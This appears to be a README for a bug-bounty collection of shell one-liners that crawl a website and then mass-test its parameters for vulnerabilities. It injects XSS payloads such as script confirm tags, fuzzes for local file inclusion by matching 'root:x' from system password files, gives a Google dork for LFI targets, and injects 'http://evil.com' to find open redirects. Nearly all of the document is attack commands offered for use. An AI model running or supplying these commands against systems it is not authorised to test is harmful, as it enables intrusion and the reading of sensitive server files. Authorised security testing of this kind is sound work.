# BBH-commands
One-liners for finding various vulnerabilities

# Katana webcrawler to get all the metadata
katana -u https://testphp.vulnweb.com/ -o katana.txt 

# XSS using GF patterns
cat katana.txt | gf xss | grep 'source=' | qsreplace '"><script>confirm(1)</script>' | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo -e "$host {Vulnerable}"; done

# LFI using GF patterns
cat katana.txt | gf lfi | tee lfi.txt
cat lfi.txt | qsreplace FUZZ | while read url; do ffuf -u $url -mr "root:x" -w /path/to/LFI_payloads.txt ; done

# Google Dork for LFI on Windows Server
site:http://example.com/ inurl:?filename= ext:aspx

# XSS with KXSS and Dalfox
cat katana.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe

# Open redirects
cat katana.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host; do curl -s -L "$host" -I | grep "evil.com" && echo -e "$host {Vulnerable}"; done

# XSS combined fuzzing
cat katana.txt | gf xss | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat combinedfuzz.json | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo -e "$host {VULNERABLE}\n" || echo -e "$host {Not Vulnerable}\n"; done

# Open redirects with Bhedak
cat katana.txt | grep -a -i \=http | bhedak 'http://redirect.com' | while read host; do curl -s -L "$host" -I | grep "redirect.com" && echo -e "$host {Vulnerable}"; done

# XSS with uro and freq
cat urls.txt | grep "=" | egrep -iv "\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><script>alert("XSS");</script>' | freq

